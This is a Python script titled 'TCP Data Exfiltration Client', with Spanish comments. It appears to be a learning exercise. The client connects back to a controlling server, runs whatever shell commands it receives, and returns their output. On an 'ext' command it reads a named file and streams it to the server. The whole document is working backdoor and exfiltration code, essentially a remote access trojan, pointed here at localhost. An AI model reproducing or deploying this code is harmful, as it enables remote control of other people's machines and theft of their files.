
# TCP Data Exfiltration Client

import socket 
import subprocess 
import os

#Parte del codidgo encargado de buscar el archivo que se especifico y tambien lo envia hacia el servidor.
#avisa cuando termina y si no se encontro el archivo 
def transfer(s,path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet:
            s.send(packet) 
            packet = f.read(1024)
            print("Enviando...")
        s.send(('|LISTO|').encode())
        f.close()

    else:
        s.send(('No se encontro el archivo').encode())


#parte del codigo donde se hace la conexion con el servidor y tambien recibe la variantes "bye" para salir "ext" para extraer un archivo y
#demas comando para explorar por CMD
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 2121))

    while True: 
        command = s.recv(1024)
        decode = command.decode()
        print(decode)
        if 'bye' in decode:
            print('close')
            s.close()
            break 


# Formula ext*<File Path>
# Ejemplo: ext*C:\scripts\photo.jpeg

        elif 'ext' in decode:
            print ('decoding')
            ext, path = decode.split('*')

            try: 
                transfer(s,path)
            except Exception as e:
                s.send ( str(e).encode )
                pass

#aqui podemos usar comandos como dir para revisar que contiene

        else:
            CMD = subprocess.Popen(decode, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read() ) 
            s.send( CMD.stderr.read() ) 

def main ():
    connect()
main()